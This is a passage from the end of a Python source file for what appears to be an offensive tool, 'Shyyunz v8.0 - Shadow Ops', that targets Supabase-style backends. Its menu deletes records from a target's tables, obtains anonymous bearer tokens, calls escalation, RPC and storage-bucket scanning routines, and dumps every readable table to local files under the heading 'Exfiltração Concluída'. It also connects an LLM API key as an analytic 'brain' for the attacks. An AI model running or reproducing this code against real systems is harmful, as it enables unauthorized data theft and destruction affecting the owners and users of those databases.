                        console.print(f"\n[bold yellow]Registros ({len(rows)}):[/bold yellow]")
                        for ri, row in enumerate(rows, 1):
                            label = row.get(id_col, "?")
                            if isinstance(label, dict): label = json.dumps(label)[:60]
                            extra = ""
                            for ek in ["name", "email", "status", "key", "title"]:
                                if ek in row and ek != id_col and row[ek]:
                                    extra = f" | {ek}={str(row[ek])[:30]}"
                                    break
                            console.print(f"  [red][{ri}][/red] {id_col}=[bold]{str(label)[:60]}[/bold]{extra}")
                        pick = input(f"\nQual deletar? (1-{len(rows)}): ").strip()
                        if not pick.isdigit() or int(pick) < 1 or int(pick) > len(rows):
                            console.print("[red]Número inválido.[/red]")
                        else:
                            selected = rows[int(pick) - 1]
                            filtro = f"{id_col}=eq.{selected[id_col]}"
                            console.print(f"\n[bold red]⚠ ATENÇÃO: Vai deletar de '{tabela}':[/bold red]")
                            console.print(f"[dim]{json.dumps(selected, ensure_ascii=False, indent=2)[:400]}[/dim]")
                            confirm = input("\nDigite 'DELETAR' para confirmar: ").strip()
                            if confirm == "DELETAR":
                                async with httpx.AsyncClient() as cl2:
                                    res = await cl2.delete(f"{auditor.base_url}{tabela}?{filtro}", headers=auditor.headers)
                                if res.status_code in [200, 204]:
                                    console.print(f"[bold green][+] DELETADO COM SUCESSO! ({res.status_code})[/bold green]")
                                else:
                                    console.print(f"[red]Erro ({res.status_code}): {res.text[:300]}[/red]")
                            else:
                                console.print("[yellow]Cancelado.[/yellow]")
                except Exception as e:
                    console.print(f"[red]Erro: {e}[/red]")

        elif c == "9":
            console.print("[dim][*] Tentando login anônimo...[/dim]")
            try:
                async with httpx.AsyncClient() as cl:
                    r = await cl.post(f"{auditor.auth_url}signup", headers={"apikey": auditor.apikey, "Content-Type": "application/json"}, json={}, timeout=10.0)
                    data = r.json()
                    token = data.get('access_token')
                    if token:
                        auditor.bearer = token
                        auditor.headers["Authorization"] = f"Bearer {token}"
                        console.print("[bold green][+] Anonimato ativado! Token configurado.[/bold green]")
                    else:
                        console.print(f"[yellow][!] Sem token anônimo disponível. Resposta: {str(data)[:200]}[/yellow]")
            except Exception as e:
                console.print(f"[red]Erro: {e}[/red]")

        elif c == "E":
            await auditor.exploit_escalation()

        elif c == "R":
            await auditor.rpc_sniper(brain)

        elif c == "B":
            await auditor.deep_bucket_scan()

        elif c == "D":
            out = f"dump_{auditor.project_ref}"
            os.makedirs(out, exist_ok=True)
            count = 0
            async with httpx.AsyncClient() as cl:
                for r in auditor.results:
                    if r.get('readable'):
                        try:
                            resp = await cl.get(f"{auditor.base_url}{r['name']}?select=*", headers=auditor.headers)
                            with open(f"{out}/{r['name']}.json", "w") as f:
                                f.write(json.dumps(resp.json(), indent=2))
                            console.print(f"  [green][+] {r['name']}.json[/green]")
                            count += 1
                        except: pass
            console.print(Panel(f"{count} arquivos salvos em [bold green]{out}/[/bold green]", title="Exfiltração Concluída"))

        elif c == "K":
            console.print("\n[bold cyan]--- CONFIGURAÇÕES ---[/bold cyan]")
            opt = input("[1] Ver Memória  [2] Trocar Gemini Key  [3] Limpar Memória  [Enter] Cancelar: ").strip()
            if opt == "1":
                console.print(Panel(json.dumps(knowledge.data, indent=2), title="Conhecimento Acumulado"))
            elif opt == "2":
                new_key = input("Nova API Key (sk-...): ").strip()
                if sh_config.set_api_key(new_key):
                    console.print("[green][+] Chave atualizada com sucesso![/green]")
                else:
                    console.print("[red]Chave inválida (deve começar com AIzaSy).[/red]")
            elif opt == "3":
                knowledge.data = {"tables": [], "rpcs": [], "buckets": []}
                knowledge.save()
                console.print("[green]Memória limpa![/green]")
        else:
            console.print("[yellow]Comando não reconhecido.[/yellow]")

async def main():
    while not sh_config.get_api_key():
        console.clear()
        console.print(Align.center(BANNER))
        console.print(Panel(
            "[bold yellow]SHYYUNZ v8.0 - SHADOW OPS SETUP[/bold yellow]\n\n"
            "O [bold magenta]Cérebro Analítico (IA)[/bold magenta] está desativado.\n"
            "Insira sua [bold cyan]OpenAI API Key[/bold cyan] (começa com sk-...).\n\n"
            "[dim]A chave será salva localmente e nunca compartilhada.[/dim]",
            title="Configuração Inicial"
        ))
        key = console.input("\n[bold cyan][🧠 CONFIG][/bold cyan] API Key (sk-...) ou 'SAIR' p/ ignorar: ").strip()
        if key.upper() == "SAIR":
            console.print("[yellow][!] Scan rodará sem IA.[/yellow]")
            time.sleep(1.5); break
        if sh_config.set_api_key(key):
            console.print("[bold green][+] Chave salva com sucesso![/bold green]")
            time.sleep(1); break
        else:
            console.print("[bold red][!] Chave inválida. Deve começar com 'sk-'.[/bold red]")
            time.sleep(2)

    while True:
        if not await audit_routine(): break

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, EOFError):
        console.print("\n[bold cyan]👋 Shyyunz encerrado.[/bold cyan]")
